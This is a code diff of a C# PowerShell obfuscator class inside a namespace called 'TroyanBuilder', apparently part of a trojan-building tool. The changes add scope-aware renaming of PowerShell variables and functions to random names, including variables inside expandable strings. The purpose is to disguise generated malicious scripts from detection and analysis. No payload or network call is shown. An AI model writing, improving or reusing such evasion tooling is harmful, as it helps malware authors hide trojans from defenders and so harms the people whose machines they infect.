@@ -1,22 +1,34 @@
 ﻿using System.Collections.ObjectModel;
 using System.Management.Automation.Language;
 using System.Text;
+using System.Text.RegularExpressions;
 
 namespace TroyanBuilder
 {
-    public static class PowerShellObfuscator
+    public  class PowerShellObfuscator
     {
-        private static readonly Random Random = new();
-        private static readonly Dictionary<string,Dictionary<string, string>> Renamed = new();
-        private static readonly HashSet<string> GeneratedNames = new();
+        private  readonly Random Random = new();
+        private  readonly Dictionary<string,Dictionary<string, string>> Renamed = new();
+        private  readonly HashSet<string> GeneratedNames = new();
 
-        public static string Obfuscate(string psScript)
+        public string Obfuscate(string psScript)
         {
             var parsed = Parse(psScript);
-            var result = FindAndRenameVariables(parsed, "general");
-            result = FindAndRenameFunctions(parsed, "general");
-           // result = ObfuscateFunctions(result, scope);
-            return result;
+            
+
+            FindAndRenameVariables(parsed, "general", false);
+            psScript = Obfuscate(parsed);
+            parsed = Parse(psScript);
+            
+            ObfuscateFunctions(parsed, "general");
+            psScript = Obfuscate(parsed);
+            parsed = Parse(psScript);
+            
+            // FindAndRenameFunctions(parsed, "general");
+            // psScript = Obfuscate(parsed);
+            // parsed = Parse(psScript);
+     
+            return psScript;
         }
 
         public class Parsed
@@ -28,16 +40,25 @@ namespace TroyanBuilder
             public ParseError[] Errors { get; set; }
         }
 
-        private static Parsed Parse(string psScript)
+        private  Parsed Parse(string psScript)
         {
             var body = Parser.ParseInput(psScript, out Token[] tokens, out ParseError[] errors);
             if (errors.Length > 0)
                 throw new Exception("PowerShell script contains syntax errors!");
             return new Parsed() {Body = body, Tokens = tokens, Errors = errors, PsScript = psScript };
         }
-
-        private static string Obfuscate(Parsed parsed, string scope)
+        
+        static List<string> ExtractVariableNames(string input)
         {
+            var matches = Regex.Matches(input, @"\$(\w+)");
+            return matches.Select(m => m.Groups[1].Value).Distinct().ToList();
+        }
+
+        private  string Obfuscate(Parsed parsed)
+        {
+            var inScope = false;
+            var scope = "general";
+            var level = 0;
             var sb = new StringBuilder(parsed.PsScript.Length);
             int lastPos = 0;
             foreach (var token in parsed.Tokens)
@@ -48,10 +69,55 @@ namespace TroyanBuilder
                     sb.Append(q);
                 }
 
-                if (token.Kind == TokenKind.Identifier || token.Kind == TokenKind.Generic || token.Kind == TokenKind.Variable)
+                if (token.Kind == TokenKind.Function)
+                {
+                    inScope = true;
+         
+                }
+                else if (token.Kind == TokenKind.Identifier)
+                {
+                    if (inScope && level == 0)
+                    {
+                        scope = token.Text;
+                    }
+                }
+                else if (token.Kind == TokenKind.LCurly)
+                {
+                    if (inScope)
+                    {
+                        level += 1;
+                    }
+                }
+                else if (token.Kind == TokenKind.RCurly)
+                {
+                    if (inScope)
+                    {
+                        level -= 1;
+                        if (level == 0)
+                        {
+                            inScope = false;
+                            scope = "general";
+                        }
+                    }
+                }
+                
+
+                if (token.Kind == TokenKind.Identifier || token.Kind == TokenKind.Generic || token.Kind == TokenKind.Variable || token.Kind == TokenKind.StringExpandable)
                 {
                     string tokenText = token.Text;
-                    if (token.Kind == TokenKind.Variable)
+                    if (token.Kind == TokenKind.StringExpandable)
+                    {
+                        var variableNames = ExtractVariableNames(tokenText);
+                        foreach (var variableName in variableNames)
+                        {
+                            if (TryGetRenamed(scope, variableName, out var renamedVar))
+                            {
+                                tokenText = tokenText.Replace(variableName, renamedVar);
+                            }
+                        }
+                        sb.Append(tokenText);
+                    }
+                    else if (token.Kind == TokenKind.Variable)
                     {
                         string variableName = tokenText.TrimStart('$');
                         if (TryGetRenamed(scope, variableName, out var renamedVar))
@@ -104,15 +170,15 @@ namespace TroyanBuilder
             public string Scope { get; set; }
         }
 
-        private static List<string> Exclusions = new List<string>()
+        private  List<string> Exclusions = new List<string>()
         {
-            "true", "false", "PSCommandPath", "MyInvocation", "MyCommand", "Path", "Definition"
+            "true", "false"
         };
 
-        private static VarInfo GetInfo(VariableExpressionAst variable)
+        private  VarInfo GetInfo(VariableExpressionAst variable, string scope)
         {
             var result = new VarInfo();
-            result.Scope = "general";
+            result.Scope = scope;
             string variableName = variable.VariablePath.UserPath;
             result.Name = variableName.TrimStart('$');
             if (Exclusions.Select(a=> a.ToLower()).Contains(variableName.ToLower()))
@@ -136,63 +202,64 @@ namespace TroyanBuilder
         }
 
 
-        private static string FindAndRenameVariables(Parsed parsed, string scope)
+        private  void FindAndRenameVariables(Parsed parsed, string scope, bool nested)
         {
-            var vars = parsed.Body.FindAll(x => x is VariableExpressionAst, false).Cast<VariableExpressionAst>();
+            var vars = parsed.Body.FindAll(x => x is VariableExpressionAst, nested).Cast<VariableExpressionAst>();
             foreach (var variableAst in vars )
             {
-                var info = GetInfo(variableAst);
+                var info = GetInfo(variableAst, scope);
       
     
                 var newname = info.IsParameter ? info.Name : GenerateRandomName();
                 AddRenamed(info.Scope, info.Name, newname);
             }
-            var result = Obfuscate(parsed, scope);
-            return result;
         }
         
                         
-        private static string FindAndRenameFunctions(Parsed parsed, string scope)
+        private void FindAndRenameFunctions(Parsed parsed, string scope)
         {
             var funcs = parsed.Body.FindAll(x => x is FunctionDefinitionAst, false).Cast<FunctionDefinitionAst>();
             foreach (var functionAst in funcs)
             {
                 AddRenamed(scope, functionAst.Name, GenerateRandomName());
             }
-            var result = Obfuscate(parsed, scope);
-            return result;
         }
 
 
-        private static string ObfuscateFunctions(string psScript, string scope)
+        private void ObfuscateFunctions(Parsed parsed, string scope)
         {
-            var parsed = Parse(psScript);
             foreach (var functionAst in parsed.Body.FindAll(x => x is FunctionDefinitionAst, false).Cast<FunctionDefinitionAst>())
             {
                 ObfuscateFunction(functionAst);
             }
-
-            return Obfuscate(parsed, scope);
         }
 
-        private static void ObfuscateFunction(FunctionDefinitionAst functionAst)
+        private void ObfuscateFunction(FunctionDefinitionAst functionAst)
         {
             var psScript = functionAst.Body.ToString();
             var parsed = Parse(psScript);
-            var result = FindAndRenameVariables(parsed, functionAst.Name);
-            result = Obfuscate(parsed, functionAst.Name);
+            FindAndRenameVariables(parsed, functionAst.Name, true);
         }
 
-        private static void AddRenamed(string scope, string name, string newName)
+        private void AddRenamed(string scope, string name, string newName)
         {
-            scope="general";
+            if (scope != "general")
+            {
+                bool exists = TryGetRenamed("general", name, out var globalVar);
+                if (exists)
+                {
+                    Renamed.TryAdd(scope, new Dictionary<string, string>());
+                    Renamed[scope].TryAdd(name, globalVar);
+                    return;
+                }
+            }
+
             Renamed.TryAdd(scope, new Dictionary<string, string>());
             Renamed[scope].TryAdd(name, newName);
         }
 
-        private static bool TryGetRenamed(string scope, string name, out string newName)
+        private bool TryGetRenamed(string scope, string name, out string newName)
         {
-            scope="general";
             newName = name;
             var got = Renamed.TryGetValue(scope, out var dict);
             if (!got)
@@ -204,14 +271,14 @@ namespace TroyanBuilder
             return true;
         }
         
-        private static string GenerateRandomName()
+        private string GenerateRandomName()
         {
             const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
             string randomName;
 
             do
             {
-                var len = Random.Next(17, 23);
+                var len = Random.Shared.Next(17, 23);
                 randomName = new string(Enumerable.Repeat(chars, len).Select(s => s[Random.Next(s.Length)]).ToArray());
             } 
             while (GeneratedNames.Contains(randomName));
